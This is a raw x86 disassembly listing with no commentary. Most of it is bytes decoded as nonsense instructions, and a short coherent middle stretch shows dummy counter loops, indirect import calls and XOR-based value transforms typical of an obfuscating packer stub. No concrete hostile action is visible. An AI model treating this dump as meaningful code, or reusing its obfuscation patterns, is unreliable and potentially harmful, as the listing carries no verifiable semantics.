  4134c3:	rcr    al,0xbe
  4134c6:	cmc    
  4134c7:	imul   DWORD PTR fs:[ecx-0x12]
  4134cb:	push   eax
  4134cc:	push   eax
  4134cd:	xor    dh,BYTE PTR [ecx+0x3dda8b34]
  4134d3:	push   0x11995b2c
  4134d8:	sub    eax,0x265e94eb
  4134dd:	call   0x18341bec
  4134e2:	aas    
  4134e3:	fiadd  DWORD PTR [esi-0x2a8e2126]
  4134e9:	jecxz  0x413522
  4134eb:	mov    dh,0x25
  4134ed:	sbb    al,0x1a
  4134ef:	fs xchg esp,eax
  4134f1:	cmp    al,0xdd
  4134f3:	bnd jmp 0x413489
  4134f6:	cwde   
  4134f7:	mov    edx,edx
  4134f9:	sub    eax,DWORD PTR [edx]
  4134fb:	xor    BYTE PTR [ebp-0x38],ah
  4134fe:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413500:	shl    BYTE PTR [ebx],0xe1
  413503:	jmp    0xac0a:0xbccb59db
  41350a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41350b:	fs hlt 
  41350d:	lock loop 0x4134a3
  413510:	(bad)  
  413511:	cmp    BYTE PTR [edx+0x6ba7f762],ah
  413517:	add    ebx,DWORD PTR [esi+0x269cbfc7]
  41351d:	inc    ebx
  41351e:	repz into 
  413520:	pop    edi
  413521:	shr    BYTE PTR [ecx],0x31
  413524:	shr    BYTE PTR [ecx-0x7b],0x40
  413528:	or     al,0xae
  41352a:	(bad)  
  41352b:	retf   0xea6e
  41352e:	fcmovb st,st(5)
  413530:	lds    esp,FWORD PTR [eax-0xb]
  413533:	pop    ebp
  413534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413535:	lock fld TBYTE PTR [ebx+0xd9fa630]
  41353c:	dec    eax
  41353d:	push   esi
  41353e:	xchg   esi,eax
  41353f:	or     DWORD PTR [eax],edi
  413541:	adc    ebx,eax
  413543:	rol    dh,1
  413545:	cmc    
  413546:	rcl    DWORD PTR [esi],1
  413548:	call   DWORD PTR [ebx+0x5be7d6a5]
  41354e:	pop    eax
  41354f:	xor    esp,DWORD PTR [edi]
  413551:	rcr    DWORD PTR [eax],cl
  413553:	ds jo  0x4135ce
  413556:	mov    dh,0x3a
  413558:	add    BYTE PTR [ebp-0x48],dl
  41355b:	or     BYTE PTR [ecx-0x7f],al
  41355e:	sbb    al,0x9a
  413560:	sub    al,0xa
  413562:	lock lea esp,[ecx+0x5b]
  413566:	scas   al,BYTE PTR es:[edi]
  413567:	cmp    eax,0x965906d3
  41356c:	adc    al,0xc1
  41356e:	repz sbb BYTE PTR [ecx],dh
  413571:	xchg   BYTE PTR [esi-0x767b21c8],dl
  413577:	and    dl,bh
  413579:	test   al,0xe2
  41357b:	hlt    
  41357c:	and    BYTE PTR [ecx-0x39],bl
  41357f:	and    DWORD PTR [ecx+0x21],eax
  413582:	xor    ebx,DWORD PTR [edx+0x36]
  413585:	fwait
  413586:	retf   
  413587:	das    
  413588:	jae    0x4135f6
  41358a:	jns    0x4135e7
  41358c:	inc    edi
  41358d:	das    
  41358e:	jle    0x4135d2
  413590:	jo     0x41355d
  413592:	fimul  DWORD PTR [eax+0x1897fc77]
  413598:	or     al,0xfb
  41359a:	test   ecx,ebp
  41359c:	(bad)  
  41359d:	pop    eax
  41359e:	pop    esp
  41359f:	and    DWORD PTR [edi],esp
  4135a1:	into   
  4135a2:	mov    ?,ecx
  4135a4:	push   ecx
  4135a5:	sbb    eax,0xb8b55e62
  4135aa:	call   0x5073f00c
  4135af:	mov    BYTE PTR [ebp+edx*1+0x4db08fe9],0xd
  4135b7:	push   ds
  4135b8:	or     DWORD PTR [ecx+0x57e36e4a],0xa2e2a2d3
  4135c2:	xlat   BYTE PTR ds:[ebx]
  4135c3:	fcomp  QWORD PTR [edx-0x6db8d94b]
  4135c9:	or     al,0xaa
  4135cb:	cli    
  4135cc:	add    ah,cl
  4135ce:	in     eax,0xe4
  4135d0:	(bad)  
  4135d1:	mov    ah,0xfc
  4135d3:	shl    dh,1
  4135d5:	mov    edi,0x978a394f
  4135da:	mov    bl,0xa9
  4135dc:	fsubrp st(6),st
  4135de:	mov    al,0xff
  4135e0:	add    eax,0x83c3869c
  4135e5:	and    eax,0x7f4f1847
  4135ea:	cmp    DWORD PTR [esi],ebp
  4135ec:	push   esp
  4135ed:	(bad)  [edi]
  4135ef:	inc    ecx
  4135f0:	mov    ds:0x9051b0aa,eax
  4135f5:	jl     0x413608
  4135f7:	imul   ebx,edx,0x7d
  4135fa:	(bad)  
  4135fb:	mov    cl,0x24
  4135fd:	jmp    0x67fe:0x99c39b1e
  413604:	adc    BYTE PTR gs:[ecx],bl
  413607:	call   0x440:0xd0959182
  41360e:	lds    eax,FWORD PTR ds:0x51edf528
  413614:	push   esi
  413615:	ret    
  413616:	sti    
  413617:	xchg   edi,eax
  413618:	dec    eax
  413619:	jmp    0x178159ca
  41361e:	jle    0x413690
  413620:	push   0x78
  413622:	dec    ebp
  413623:	add    ecx,ebx
  413625:	ja     0x41362a
  413627:	mov    ds:0xf2b81bb9,eax
  41362c:	loop   0x4135d9
  41362e:	mov    esi,0x452b4585
  413633:	rcr    DWORD PTR [ecx+0x1a57a4d2],0x42
  41363a:	cmc    
  41363b:	pop    ss
  41363c:	fisubr DWORD PTR [eax+0x63]
  41363f:	sbb    DWORD PTR [edx+0x4a00ba87],0xea4972f5
  413649:	sahf   
  41364a:	pop    es
  41364b:	cmp    bl,0x4e
  41364e:	pop    eax
  41364f:	push   ebx
  413650:	pop    edx
  413651:	ret    0x61c0
  413654:	push   0x73
  413656:	dec    edi
  413657:	jle    0x413683
  413659:	jno    0x41362b
  41365b:	mov    ebx,0x545358c8
  413660:	inc    DWORD PTR [edx]
  413662:	push   eax
  413663:	or     BYTE PTR [ebp+0x22],cl
  413666:	adc    BYTE PTR [eax-0x17d20558],cl
  41366c:	es arpl ax,sp
  41366f:	mov    cl,0x93
  413671:	out    0xcd,al
  413673:	mov    ecx,0xa160ab5f
  413678:	mov    cl,0xd
  41367a:	inc    edx
  41367b:	pop    ds
  41367c:	hlt    
  41367d:	add    eax,0xafc23bb6
  413682:	je     0x413658
  413684:	hlt    
  413685:	sti    
  413686:	in     al,0x35
  413688:	stc    
  413689:	js     0x41366d
  41368b:	popa   
  41368c:	push   0xffffff8f
  41368e:	fidivr DWORD PTR [ecx-0x62d47edd]
  413694:	js     0x413649
  413696:	mov    edx,0x483db2b
  41369b:	(bad)  
  41369c:	imul   edi,DWORD PTR [ebx-0x71223b27],0x528540a6
  4136a6:	lahf   
  4136a7:	sar    DWORD PTR [edi-0x1841952e],1
  4136ad:	mov    esi,0x9be32ea4
  4136b2:	stc    
  4136b3:	adc    esp,0xe8a740b9
  4136b9:	gs into 
  4136bb:	outs   dx,DWORD PTR ds:[esi]
  4136bc:	jne    0x4cbfb0e1
  4136c2:	sbb    BYTE PTR [ecx+0x53],ch
  4136c5:	jne    0x413658
  4136c7:	dec    edx
  4136c8:	clc    
  4136c9:	sbb    DWORD PTR [ecx-0x11],eax
  4136cc:	bound  esp,QWORD PTR ds:0x5fc121fd
  4136d2:	push   es
  4136d3:	mov    eax,ds:0xe205c7a8
  4136d8:	int    0xb2
  4136da:	jo     0x4136f7
  4136dc:	push   0xffb7d699
  4136e1:	and    DWORD PTR [ecx+ebp*2+0x7e65c5f9],0x37ac2e5e
  4136ec:	sub    al,0x6d
  4136ee:	mov    edx,0x443fedc2
  4136f3:	rcl    BYTE PTR [ebp-0x1],0x5f
  4136f7:	pop    edx
  4136f8:	jne    0x41373f
  4136fa:	sub    al,dl
  4136fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136fd:	mov    bl,0xea
  4136ff:	pop    ss
  413700:	stos   BYTE PTR es:[edi],al
  413701:	sbb    bl,ch
  413703:	and    BYTE PTR [edi+0x3a],ah
  413706:	mov    DWORD PTR [ebx-0x328c326],esi
  41370c:	jnp    0x413725
  41370e:	retf   0x5f8f
  413711:	sti    
  413712:	dec    BYTE PTR [eax+0x6f]
  413715:	rcr    cl,0x3a
  413718:	xor    ebx,0x96a72c6c
  41371e:	xlat   BYTE PTR ds:[ebx]
  41371f:	das    
  413720:	mov    esp,0xcc88e813
  413725:	daa    
  413726:	(bad)  
  413727:	mov    dl,0xde
  413729:	call   0xf988:0x5142314a
  413730:	in     eax,0x28
  413732:	xor    dh,BYTE PTR [ebx+0x51]
  413735:	lods   eax,DWORD PTR ds:[esi]
  413736:	aaa    
  413737:	push   es
  413738:	sbb    eax,0xeef42ef1
  41373d:	push   esp
  41373e:	mov    ah,BYTE PTR [ebp-0x6c8ba3f9]
  413744:	push   edx
  413745:	aad    0x7d
  413747:	cld    
  413748:	leave  
  413749:	shl    ebx,1
  41374b:	jb     0x4137a3
  41374d:	(bad)  
  41374e:	push   ss
  41374f:	xlat   BYTE PTR ds:[ebx]
  413750:	jb     0x413725
  413752:	mov    al,0xf0
  413754:	add    eax,0x9e7ad5c1
  413759:	or     al,0x84
  41375b:	icebp  
  41375c:	leave  
  41375d:	(bad)  
  41375e:	cmp    cl,BYTE PTR [ebp-0x52]
  413761:	adc    DWORD PTR [eax+eax*8-0x40d0d48b],esi
  413768:	xchg   BYTE PTR [eax-0x1392dd13],bl
  41376e:	int    0x9
  413770:	arpl   WORD PTR [ebp-0x76],sp
  413773:	out    dx,eax
  413774:	(bad)  [esi-0x20]
  413777:	fwait
  413778:	xor    DWORD PTR [edi-0x39],esi
  41377b:	aam    0xaf
  41377d:	test   DWORD PTR [esi],0xbb1b661e
  413783:	add    al,0x5b
  413785:	sub    eax,0x8f28dc88
  41378a:	cmp    dh,ah
  41378c:	dec    ebx
  41378d:	test   ah,0x31
  413790:	shl    BYTE PTR [ecx+0x27684d5b],cl
  413796:	test   al,0x4
  413798:	jo     0x4137ce
  41379a:	imul   esp,DWORD PTR [esi+0x29],0x2c
  41379e:	xchg   ebx,eax
  41379f:	in     eax,0xb3
  4137a1:	(bad)  
  4137a2:	ficom  DWORD PTR [ebp+0x13]
  4137a5:	lock adc al,0x5d
  4137a9:	ret    
  4137aa:	das    
  4137ab:	xor    al,0xe0
  4137ad:	push   es
  4137ae:	jno    0x4137f6
  4137b0:	les    eax,FWORD PTR [esi-0x58]
  4137b3:	xor    eax,edi
  4137b5:	in     al,dx
  4137b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137b7:	or     BYTE PTR [ebx+0x29],ah
  4137ba:	and    eax,0xe091fb0a
  4137bf:	adc    eax,0x995006b9
  4137c4:	imul   esi,DWORD PTR [edx],0xd6911aa4
  4137ca:	mov    ebx,0x51daef9e
  4137cf:	scas   eax,DWORD PTR es:[edi]
  4137d0:	repnz (bad) 
  4137d3:	cwde   
  4137d4:	lock and bh,bl
  4137d7:	fdiv   st(5),st
  4137d9:	push   eax
  4137da:	dec    edx
  4137db:	sub    DWORD PTR [ecx],esi
  4137dd:	je     0x413830
  4137df:	jmp    0x5fcbacb1
  4137e4:	inc    edx
  4137e5:	loop   0x4137d9
  4137e7:	pop    esi
  4137e8:	pop    esp
  4137e9:	xchg   ebp,eax
  4137ea:	xor    BYTE PTR [eax],bh
  4137ec:	push   esp
  4137ed:	and    ebp,ebx
  4137ef:	jecxz  0x413814
  4137f1:	and    ecx,ebx
  4137f3:	sbb    dh,BYTE PTR [esi-0x18]
  4137f6:	dec    ebx
  4137f7:	ss dec ebp
  4137f9:	mov    DWORD PTR [edi],ebp
  4137fb:	xchg   esi,eax
  4137fc:	stos   BYTE PTR es:[edi],al
  4137fd:	test   ecx,esp
  4137ff:	sbb    ah,ah
  413801:	or     esi,eax
  413803:	push   eax
  413804:	dec    edx
  413805:	out    dx,eax
  413806:	popf   
  413807:	bound  edx,QWORD PTR [edx-0x30]
  41380a:	add    al,0x4d
  41380c:	retf   0x2b36
  41380f:	lods   al,BYTE PTR ds:[esi]
  413810:	mov    al,ds:0x5ca1638
  413815:	mov    ecx,gs
  413817:	mov    bl,0x7f
  413819:	pop    ds
  41381a:	cmp    BYTE PTR [ebp+0xd7ae0a2],dl
  413820:	push   esi
  413821:	or     cl,BYTE PTR [ebx]
  413823:	fistp  QWORD PTR [edx-0x154442b9]
  413829:	popa   
  41382a:	xchg   BYTE PTR [ebx-0x1c],cl
  41382d:	sub    ch,BYTE PTR [edi+edx*8-0x2d9c92a]
  413834:	iret   
  413835:	in     al,0xc4
  413837:	or     DWORD PTR [edi],esp
  413839:	cdq    
  41383a:	mov    edi,0xf8e02d2c
  41383f:	arpl   WORD PTR [ecx],cx
  413841:	push   ecx
  413842:	dec    edx
  413843:	mov    esi,0x8e287d6e
  413848:	mov    ds,WORD PTR [ebx+0x31]
  41384b:	popa   
  41384c:	mov    bh,0x1d
  41384e:	pop    esi
  41384f:	push   0x5e
  413851:	popa   
  413852:	into   
  413853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413854:	or     DWORD PTR [eax+ebp*1-0x1de9086a],0x96f6f1ac
  41385f:	addr16 pop esi
  413861:	leave  
  413862:	add    eax,0xf558dad9
  413867:	jle    0x4138e0
  413869:	shl    BYTE PTR [eax+0x0],cl
  41386c:	retf   0x5146
  41386f:	xlat   BYTE PTR ds:[ebx]
  413870:	mov    DWORD PTR ds:0xef5b1c50,edx
  413877:	sti    
  413878:	(bad)  
  413879:	jno    0x41383a
  41387b:	push   esp
  41387c:	or     bh,BYTE PTR [eax+esi*2-0x66709d08]
  413883:	jmp    0x4368:0x8abbf433
  41388a:	pop    DWORD PTR [eax+0x66]
  41388d:	push   esi
  41388e:	jne    0x413817
  413890:	loop   0x413874
  413892:	push   0x2b976734
  413897:	mov    dh,BYTE PTR [edx]
  413899:	sbb    al,0x4d
  41389b:	jge    0x413891
  41389d:	xchg   ecx,eax
  41389e:	aam    0xf6
  4138a0:	or     edx,ecx
  4138a2:	stos   BYTE PTR es:[edi],al
  4138a3:	mov    bh,0x69
  4138a5:	xchg   ecx,eax
  4138a6:	jae    0x4138c8
  4138a8:	jo     0x41386f
  4138aa:	retf   0xafbb
  4138ad:	xchg   ebx,eax
  4138ae:	js     0x413857
  4138b0:	repz cmp ebx,edx
  4138b3:	xchg   ebp,eax
  4138b4:	sti    
  4138b5:	pop    es
  4138b6:	mov    edx,0x1c53706f
  4138bb:	dec    esp
  4138bc:	or     DWORD PTR ds:0xf7573c02,esp
  4138c2:	fst    QWORD PTR [edi+0xd]
  4138c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138c6:	mov    DWORD PTR [ecx],esi
  4138c8:	cmc    
  4138c9:	xlat   BYTE PTR ds:[ebx]
  4138ca:	cmp    edi,0xffffffd2
  4138cd:	inc    eax
  4138ce:	sub    eax,DWORD PTR [esi+eiz*4]
  4138d1:	out    dx,eax
  4138d2:	aas    
  4138d3:	gs gs loop 0x4138ee
  4138d7:	nop
  4138d8:	push   esi
  4138d9:	std    
  4138da:	sub    DWORD PTR [edx+0x39],edi
  4138dd:	test   eax,0xb892fb3f
  4138e2:	mov    ebx,0x2581d833
  4138e7:	sbb    al,0xb0
  4138e9:	inc    edx
  4138ea:	add    BYTE PTR [esi+0x4e],ah
  4138ed:	add    BYTE PTR [eax],al
  4138ef:	sub    edx,ebx
  4138f1:	sub    edx,esi
  4138f3:	adc    DWORD PTR ds:0x42c014,0x3307
  4138fd:	xor    edx,eax
  4138ff:	add    DWORD PTR ds:0x42d004,0x3241
  413909:	mov    DWORD PTR [ebp+0x8],edx
  41390c:	or     ebx,ebx
  41390e:	mov    edx,DWORD PTR [ebp+0x8]
  413911:	mov    ebx,DWORD PTR [ebp-0x58]
  413914:	sub    DWORD PTR ds:0x429004,0x42c00c
  41391e:	add    edx,0x5708c4
  413924:	imul   edx,ebx
  413927:	mov    DWORD PTR [ebp-0x58],edx
  41392a:	mov    edx,DWORD PTR [ebp+0x8]
  41392d:	and    DWORD PTR ds:0x42d01c,0x0
  413937:	mov    ebx,DWORD PTR ds:0x42d01c
  41393d:	inc    ebx
  41393e:	mov    DWORD PTR ds:0x42d01c,ebx
  413944:	cmp    DWORD PTR ds:0x42d01c,0x29
  41394b:	jne    0x41395a
  413951:	push   DWORD PTR [ebp-0x24]
  413954:	call   DWORD PTR ds:0x42e913
  41395a:	cmp    DWORD PTR ds:0x42d01c,0x1e
  413961:	jb     0x413937
  413967:	and    DWORD PTR ds:0x42d004,0x0
  413971:	mov    ebx,DWORD PTR ds:0x42d004
  413977:	inc    ebx
  413978:	mov    DWORD PTR ds:0x42d004,ebx
  41397e:	cmp    DWORD PTR ds:0x42d004,0x7
  413985:	jne    0x4139a0
  41398b:	push   0x1baa
  413990:	push   0x42e075
  413995:	push   0x429010
  41399a:	call   DWORD PTR ds:0x42e917
  4139a0:	cmp    DWORD PTR ds:0x42d004,0x6
  4139a7:	jne    0x4139ba
  4139ad:	mov    ebx,DWORD PTR ds:0x42d004
  4139b3:	inc    ebx
  4139b4:	mov    DWORD PTR ds:0x42d004,ebx
  4139ba:	cmp    DWORD PTR ds:0x42d004,0x14
  4139c1:	jb     0x413971
  4139c7:	add    DWORD PTR ds:0x42d000,edx
  4139cd:	mov    ebx,DWORD PTR [ebp-0x54]
  4139d0:	mov    DWORD PTR ds:0x42b008,0x4ad3
  4139da:	add    edx,0x64f8da
  4139e0:	or     edx,ebx
  4139e2:	add    DWORD PTR ds:0x42c008,0x5d21
  4139ec:	mov    DWORD PTR [ebp-0x54],edx
  4139ef:	mov    edx,DWORD PTR [ebp+0x8]
  4139f2:	mov    ebx,DWORD PTR [ebp-0x50]
  4139f5:	and    DWORD PTR ds:0x42b008,0x3404
  4139ff:	add    edx,ecx
  413a01:	xor    DWORD PTR ds:0x42a000,0x42d000
  413a0b:	xor    edx,ebx
  413a0d:	mov    DWORD PTR [ebp-0x50],edx
  413a10:	add    ebx,edx
  413a12:	mov    edx,DWORD PTR [ebp+0x8]
  413a15:	adc    DWORD PTR ds:0x429008,edx
  413a1b:	mov    ebx,DWORD PTR [ebp-0x4c]
  413a1e:	or     DWORD PTR ds:0x429028,0x42d010
  413a28:	add    edx,edi
  413a2a:	or     DWORD PTR ds:0x429008,0x429010
  413a34:	and    edx,ebx
  413a36:	xor    DWORD PTR ds:0x429028,ecx
  413a3c:	mov    DWORD PTR [ebp-0x4c],edx
  413a3f:	mov    DWORD PTR ds:0x42c004,0x18
  413a49:	cmp    DWORD PTR ds:0x42c004,0x0
  413a50:	je     0x413a93
  413a56:	cmp    DWORD PTR ds:0x42c004,0x1e
  413a5d:	jne    0x413a7b
  413a63:	push   0x42a004
  413a68:	push   0x2285
  413a6d:	push   DWORD PTR [ebp-0x24]
  413a70:	push   0x1fc0
  413a75:	call   DWORD PTR ds:0x42e8cf
  413a7b:	mov    ebx,DWORD PTR ds:0x42c004
  413a81:	dec    ebx
  413a82:	mov    DWORD PTR ds:0x42c004,ebx
  413a88:	jmp    0x413a49
  413a8d:	add    DWORD PTR ds:0x42d00c,ecx
  413a93:	mov    edx,DWORD PTR [ebp+0x8]
  413a96:	sbb    ebx,DWORD PTR ds:0x42a00c
  413a9c:	mov    ebx,DWORD PTR [ebp-0x48]
  413a9f:	lea    edx,[ebx+edx*1+0x241fc1f]
  413aa6:	mov    DWORD PTR [ebp-0x48],edx
  413aa9:	inc    edx
  413aaa:	mov    edx,DWORD PTR [ebp+0x8]
  413aad:	movzx  ebx,BYTE PTR ds:0x429000
  413ab4:	sbb    DWORD PTR ds:0x42c018,ebx
  413aba:	mov    ebx,0xfa5e15e2
  413abf:	sub    ebx,edx
  413ac1:	add    ebx,DWORD PTR [ebp-0x44]
  413ac4:	and    DWORD PTR ds:0x42c018,0x0
  413ace:	jmp    0x413ae0
  413ad3:	mov    edx,DWORD PTR ds:0x42c018
  413ad9:	inc    edx
  413ada:	mov    DWORD PTR ds:0x42c018,edx
  413ae0:	cmp    DWORD PTR ds:0x42c018,0x15
  413ae7:	jae    0x413b1a
  413aed:	cmp    DWORD PTR ds:0x42c018,0x18
  413af4:	jne    0x413b0f
  413afa:	push   0x88b0
  413aff:	push   0x8c9b
  413b04:	push   0x27a5
  413b09:	call   DWORD PTR ds:0x42e8d3
  413b0f:	jmp    0x413ad3
  413b14:	or     DWORD PTR ds:0x42b004,edx
  413b1a:	mov    DWORD PTR [ebp-0x44],ebx
  413b1d:	mov    DWORD PTR ds:0x42d00c,0x11
  413b27:	cmp    DWORD PTR ds:0x42d00c,0x0
  413b2e:	je     0x413b75
  413b34:	cmp    DWORD PTR ds:0x42d00c,0x1d
  413b3b:	jne    0x413b59
  413b41:	push   0x88e0
  413b46:	push   DWORD PTR [ebp-0x18]
  413b49:	push   0x3079
  413b4e:	push   0x26f3
  413b53:	call   DWORD PTR ds:0x42e8d7
  413b59:	mov    edx,DWORD PTR ds:0x42d00c
  413b5f:	dec    edx
  413b60:	mov    DWORD PTR ds:0x42d00c,edx
  413b66:	jmp    0x413b27
  413b6b:	add    DWORD PTR ds:0x42a014,0x1458
  413b75:	mov    edx,DWORD PTR [ebp+0x8]
  413b78:	xor    DWORD PTR ds:0x429008,0x1867
  413b82:	xor    edx,eax
  413b84:	mov    DWORD PTR ds:0x42900c,0x6609
  413b8e:	add    edx,esi
  413b90:	mov    DWORD PTR ds:0x42d008,0x7de
  413b9a:	jne    0x41157e
  413ba0:	mov    DWORD PTR ds:0x42a008,0x2294
  413baa:	jmp    0x41cc2e
  413baf:	xor    edx,edx
  413bb1:	add    edx,DWORD PTR ds:0x42d014
  413bb7:	sbb    DWORD PTR ds:0x429008,edx
  413bbd:	mov    edx,DWORD PTR [ebp-0xc]
  413bc0:	mov    DWORD PTR ds:0x429010,0x17
  413bca:	cmp    DWORD PTR ds:0x429010,0x0
  413bd1:	je     0x413c04
  413bd7:	cmp    DWORD PTR ds:0x429010,0x18
  413bde:	jne    0x413bea
  413be4:	call   DWORD PTR ds:0x42e91b
  413bea:	xor    ebx,ebx
  413bec:	add    ebx,DWORD PTR ds:0x429010
  413bf2:	dec    ebx
  413bf3:	mov    DWORD PTR ds:0x429010,ebx
  413bf9:	jmp    0x413bca
  413bfe:	or     DWORD PTR ds:0x42c014,ebx
  413c04:	sub    edx,esi
  413c06:	xor    edx,eax
  413c08:	mov    ebx,DWORD PTR ds:0x41cdd0
  413c0e:	mov    ebx,DWORD PTR [ebx]
  413c10:	sub    DWORD PTR ds:0x42b018,ebx
  413c16:	mov    DWORD PTR [ebp-0x5c],edx
  413c19:	and    DWORD PTR ds:0x42b004,0x0
  413c23:	jmp    0x413c35
  413c28:	mov    ebx,DWORD PTR ds:0x42b004
  413c2e:	inc    ebx
  413c2f:	mov    DWORD PTR ds:0x42b004,ebx
  413c35:	cmp    DWORD PTR ds:0x42b004,0x1c
  413c3c:	jae    0x413c60
  413c42:	cmp    DWORD PTR ds:0x42b004,0x24
  413c49:	jne    0x413c5b
  413c4f:	push   DWORD PTR [ebp-0x1c]
  413c52:	push   DWORD PTR [ebp-0x10]
  413c55:	call   DWORD PTR ds:0x42e91f
  413c5b:	jmp    0x413c28
  413c60:	mov    edx,DWORD PTR [ebp-0x10]
  413c63:	mov    ebx,DWORD PTR [ebp-0x8]
  413c66:	xor    edx,eax
  413c68:	xor    ebx,eax
  413c6a:	sub    edx,ebx
  413c6c:	sub    edx,esi
  413c6e:	xor    edx,eax
  413c70:	mov    DWORD PTR [ebp-0x10],edx
  413c73:	mov    edx,DWORD PTR [ebp-0x14]
  413c76:	mov    DWORD PTR [ebp+0x8],edx
  413c79:	jmp    0x416037
  413c7e:	mov    edx,DWORD PTR [ebp+0x8]
  413c81:	mov    ebx,DWORD PTR [ebp-0x8]
  413c84:	xor    edx,eax
  413c86:	xor    ebx,eax
  413c88:	sub    edx,ebx
  413c8a:	sub    edx,esi
  413c8c:	xor    edx,eax
  413c8e:	mov    DWORD PTR [ebp+0x8],edx
  413c91:	mov    edx,DWORD PTR [ebp+0x8]
  413c94:	mov    ebx,DWORD PTR [ebp-0x58]
  413c97:	add    edx,0x5708c4
  413c9d:	imul   edx,ebx
  413ca0:	mov    DWORD PTR [ebp-0x58],edx
  413ca3:	mov    edx,DWORD PTR [ebp+0x8]
  413ca6:	mov    ebx,DWORD PTR [ebp-0x54]
  413ca9:	add    edx,0x64f8da
  413caf:	or     edx,ebx
  413cb1:	mov    DWORD PTR [ebp-0x54],edx
  413cb4:	mov    edx,DWORD PTR [ebp+0x8]
  413cb7:	mov    ebx,DWORD PTR [ebp-0x50]
  413cba:	add    edx,ecx
  413cbc:	jmp    0x416005
  413cc1:	xchg   ecx,eax
  413cc2:	mov    bh,BYTE PTR [edx]
  413cc4:	aad    0x3
  413cc6:	mov    ch,0x93
  413cc8:	mov    ah,al
  413cca:	xor    ebx,ecx
  413ccc:	ja     0x413d44
  413cce:	pop    ss
  413ccf:	(bad)  
  413cd2:	mov    bh,BYTE PTR [esp+edi*2+0x40]
  413cd6:	pop    edi
  413cd7:	jl     0x413d55
  413cd9:	dec    esp
  413cda:	js     0x413cf6
  413cdc:	(bad)  
  413cde:	push   0x39
  413ce0:	imul   ebx,ebx,0x16952cd2
  413ce6:	sub    ebx,DWORD PTR [ebp-0x33]
  413ce9:	push   esi
  413cea:	repnz mov esp,DWORD PTR [edx-0x6ed2566f]
  413cf1:	push   esp
  413cf2:	dec    esp
  413cf3:	inc    edx
  413cf4:	sar    DWORD PTR [ecx-0x6968517c],cl
  413cfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cfb:	cmc    
  413cfc:	sti    
  413cfd:	jle    0x413c87
  413cff:	push   es
  413d00:	adc    eax,0x93dd38c8
  413d05:	fxch   st(2)
  413d07:	and    BYTE PTR [eax],0x1f
  413d0a:	add    eax,0x2a48468a
  413d0f:	dec    ebp
  413d10:	inc    ebp
  413d11:	leave  
  413d12:	mov    ecx,0x6a8b8cdd
  413d17:	adc    eax,0x39c776eb
  413d1c:	sbb    BYTE PTR [ecx-0x37aaf5b5],al
  413d22:	shr    DWORD PTR [esi-0x59],cl
  413d25:	mov    bl,0xda
  413d27:	xchg   esp,eax
  413d28:	imul   edi,DWORD PTR [edi-0x4c619f58],0x10
  413d2f:	jno    0x413d26
  413d31:	jne    0x413d13
  413d33:	and    DWORD PTR [ebp+0x26],edi
  413d36:	inc    eax
  413d37:	repnz enter 0xdc09,0x12
  413d3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d3d:	test   dl,dl
  413d3f:	add    al,0x5
  413d41:	pop    DWORD PTR [edx-0x647179f3]
  413d47:	aas    
  413d48:	push   ecx
  413d49:	xchg   esi,eax
  413d4a:	fcomp  DWORD PTR [ebx]
  413d4c:	aad    0xd7
  413d4e:	and    eax,0x4e4a3f30
  413d53:	int3   
  413d54:	(bad)  
  413d55:	fistp  WORD PTR [esi]
  413d57:	iret   
  413d58:	jno    0x413d31
  413d5a:	rcl    BYTE PTR [ebx-0x713ded7c],cl
  413d60:	loop   0x413d26
  413d62:	in     eax,0x32
  413d64:	inc    ebx
  413d65:	cmp    dh,cl
  413d67:	test   eax,0xb4369d28
  413d6c:	mov    ebx,0xcf9a988e
  413d71:	ret    
  413d72:	xor    eax,0xa2122c87
  413d77:	out    0x3e,eax
  413d79:	xchg   BYTE PTR [eax-0x5],dl
  413d7c:	push   es
  413d7d:	and    DWORD PTR [esp+ebx*4-0x17],0xb1017462
  413d85:	mov    ecx,0xb40d2983
  413d8a:	pop    ebx
  413d8b:	jae    0x413d51
  413d8d:	xlat   BYTE PTR ds:[ebx]
  413d8e:	ss adc eax,0x5551d7a8
  413d94:	or     bh,cl
  413d96:	mov    dl,0xf6
  413d98:	dec    esp
  413d99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d9a:	je     0x413da7
  413d9c:	stc    
  413d9d:	jnp    0x413def
  413d9f:	popa   
  413da0:	jno    0x413e17
  413da2:	mov    ds:0x69f72131,al
  413da7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413da8:	mov    ds:0x514b8998,al
  413dad:	pop    ecx
  413dae:	xchg   ebx,eax
  413daf:	nop
  413db0:	out    dx,al
  413db1:	mov    edx,0x70bf13f7
  413db6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413db7:	push   ss
  413db8:	nop
  413db9:	or     al,0x15
  413dbb:	adc    al,0x91
  413dbd:	fwait
  413dbe:	sbb    eax,DWORD PTR [ebx-0x21]
  413dc1:	mov    eax,DWORD PTR [eax-0x60]
  413dc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413dc5:	fwait
  413dc6:	(bad)  
  413dc7:	dec    esi
  413dc8:	in     al,dx
  413dc9:	mov    eax,ds:0x492f091c
  413dce:	inc    ebx
  413dcf:	ror    DWORD PTR [edi],cl
  413dd1:	mov    ebx,0x9ea42d2d
  413dd6:	pop    edi
  413dd7:	loopne 0x413e49
  413dd9:	pop    esi
  413dda:	ret    0xd740
  413ddd:	cwde   
  413dde:	inc    ebp
  413ddf:	pop    esi
  413de0:	ret    0x74de
  413de3:	mov    dl,0xb1
  413de5:	popf   
  413de6:	call   0xdc8a94b0
  413deb:	push   edi
  413dec:	and    eax,0x74729ccf
  413df1:	ffree  st(4)
  413df3:	in     al,dx
  413df4:	mov    ecx,DWORD PTR ds:0x7fed0996
  413dfa:	xchg   ebp,eax
  413dfb:	add    ecx,DWORD PTR ds:0x282812db
  413e01:	jmp    0x64d0:0x59a74e7a
  413e08:	scas   al,BYTE PTR es:[edi]
  413e09:	jbe    0x413dae
  413e0b:	cdq    
  413e0c:	inc    edx
  413e0d:	mov    dh,0xc
  413e0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e10:	xor    eax,0xe00042d4
  413e15:	out    dx,eax
